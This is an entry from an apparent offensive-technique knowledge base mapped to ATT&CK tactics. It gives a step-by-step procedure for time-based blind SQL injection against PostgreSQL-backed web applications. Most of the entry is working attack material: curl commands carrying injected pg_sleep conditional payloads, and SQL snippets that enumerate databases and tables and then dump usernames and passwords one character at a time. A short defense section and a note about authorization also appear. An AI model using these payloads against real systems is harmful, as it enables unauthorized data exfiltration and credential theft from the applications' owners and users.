---
id: daa3eeaa-67c6-49ec-87de-c9dcfff3f857
name: PostgreSQL-Time-Based-Blind-Injection-for-Database-Dump
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:35.855220+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Exfiltration Over Command and Control Channel|T1041 -
    Exfiltration Over Command and Control Channel]]
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
tags:
  - '[[tags/Database dump time based]]'
  - '[[tags/Identify time based]]'
  - '[[tags/PostgreSQL injection]]'
  - '[[tags/PostgreSQL Time Based]]'
  - sql-injection
  - blind-injection
  - time-based
commands:
  - '[[commands/curl-postgresql-sqli-payload]]'
platforms:
  - Web
  - Linux
  - PostgreSQL
tools: []
validated: true
---

# PostgreSQL-Time-Based-Blind-Injection-for-Database-Dump

## Summary

This procedure demonstrates how to perform time-based blind SQL injection on a PostgreSQL database to extract sensitive data, such as database names, table structures, and contents, by inferring information through conditional delays in query responses using the pg_sleep function. It is particularly useful when error-based or union-based injection is not possible, allowing attackers to dump database information bit by bit via timing differences.

## Description

Time-based blind SQL injection exploits vulnerable input parameters in web applications connected to PostgreSQL databases by injecting SQL payloads that cause measurable delays in server responses based on true/false conditions. The pg_sleep function is used to introduce delays (e.g., 5 seconds if a condition is true), enabling the attacker to deduce data values without direct output from the application. This technique targets public-facing web apps with insufficient input sanitization, such as search forms or login pages. In a typical scenario, an attacker identifies a vulnerable endpoint, crafts conditional sleep queries to extract metadata from system tables like pg_database or pg_tables, and progressively dumps user data. Success relies on consistent timing measurements and can be automated but is manually demonstrated here for educational purposes. Expected outcomes include full database schema enumeration and data exfiltration, potentially leading to credential theft or further lateral movement.

## Requirements

1. Network access to a web application vulnerable to SQL injection in a parameter that influences PostgreSQL queries (e.g., via GET/POST requests).
2. Knowledge of the injection point, such as a URL parameter like ?id=1 or a form field.
3. Tools for sending HTTP requests and measuring response times (e.g., curl with timing flags).
4. Basic understanding of SQL syntax and PostgreSQL system tables (e.g., pg_database, pg_tables).
5. A controlled environment or authorization for testing to avoid illegal access.

## Defense

- Implement strict input validation and sanitization on all user inputs using whitelisting.
- Use prepared statements and parameterized queries in application code to separate SQL logic from data.
- Deploy a Web Application Firewall (WAF) to detect and block anomalous SQL patterns and timing-based requests.
- Enable database logging for long-running queries and monitor for unusual delays or pg_sleep usage.
- Regularly audit application code and conduct SQL injection penetration testing.

## Objectives

1. Confirm the presence of time-based blind SQL injection vulnerability.
2. Extract database metadata, such as names and schemas, character by character.
3. Dump table names, column structures, and sensitive data like usernames and passwords.
4. Achieve full database content exfiltration without direct query output.

## Instructions

### Step 1: Identify and Test Vulnerable Injection Point

**Context**: Locate a parameter in the web application that is vulnerable to SQL injection and test basic boolean conditions to confirm time-based behavior. This step verifies if the application delays responses based on injected conditions, using a simple true/false sleep test.

**Command** ([[commands/curl-postgresql-sqli-payload]]):
```bash
curl -X GET "http://target.com/vulnerable?id=1' AND (CASE WHEN (SUBSTRING((SELECT datname FROM pg_database LIMIT 1),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END)--" -w "%{time_total}s\n" -s -o /dev/null
```

> This command sends a GET request with an injected SQL payload that checks if the first character of the first database name is 'p' (common for 'postgres'). If true, it sleeps 5 seconds; otherwise, 0 seconds. Measure the total response time with -w. A delay of ~5 seconds indicates a true condition, confirming vulnerability. Adjust the URL and parameter based on the target. Repeat with a known false condition (e.g., ='z') to baseline normal response time (~0-1s).

### Step 2: Extract Database Name Character by Character

**Context**: Once vulnerability is confirmed, systematically extract the database name by testing each character's ASCII value or specific letters using conditional sleeps. This builds the full name bit by bit, starting from position 1.

Use the following code snippet embedded in requests via [[commands/curl-postgresql-sqli-payload]]:

**Code** ([[codes/PostgreSQL-PG-Sleep-Database-Name-Test]]):
```sql
select case when substring((select datname from pg_database where datname='target_db'),1,1)='a' then pg_sleep(5) else pg_sleep(0) end
```

> Modify the condition (e.g., ='a', then ='b', up to ='z') and position (1,2,3...) in the curl command from Step 1. Send requests for each possibility until a 5-second delay confirms the character. For example, to test position 1 for 'p': replace the payload accordingly. Track delays to reconstruct the name (e.g., 'postgres'). This may take 26 requests per position; automate if possible, but manually verify timing. Expected: Full database name after testing all positions (typically 1-20 characters).

### Step 3: Enumerate Tables and Dump Data

**Context**: With the database name known, extract table names from pg_tables and then query specific tables for data. Use similar conditional sleeps to infer table names and row contents, focusing on sensitive tables like users.

Adapt the code from Step 2 for tables:

**Code** ([[codes/PostgreSQL-PG-Sleep-Database-Name-Test]]):
```sql
select case when substring((select tablename from pg_tables where schemaname='public' limit 1),1,1)='u' then pg_sleep(5) else pg_sleep(0) end
```

> Inject via [[commands/curl-postgresql-sqli-payload]] to test characters for table names (e.g., 'users'). Once identified, extract column names from pg_attribute and then data from the table, e.g., usernames: substring((select username from users limit 1),1,1)='a'. Chain conditions for multiple rows. Expected: List of tables, then dumped data like credentials. Verify by reconstructing strings from delay patterns.

### Step 4: Verify and Exfiltrate Dumped Data

**Context**: Compile the extracted data and confirm completeness by testing for additional databases or schemas. This final step ensures the dump is accurate and prepares for further use.

**Command** ([[commands/curl-postgresql-sqli-payload]]):
```bash
curl -X GET "http://target.com/vulnerable?id=1' AND (SELECT COUNT(*) FROM pg_database)>0--" -w "%{time_total}s\n" -s -o /dev/null
```

> Use a non-sleep query to count databases/tables for verification (adjust for sleep if needed). Log all extracted data to a file. If delays match expected patterns without errors, the dump is successful. Expected: Confirmed counts matching extracted names.
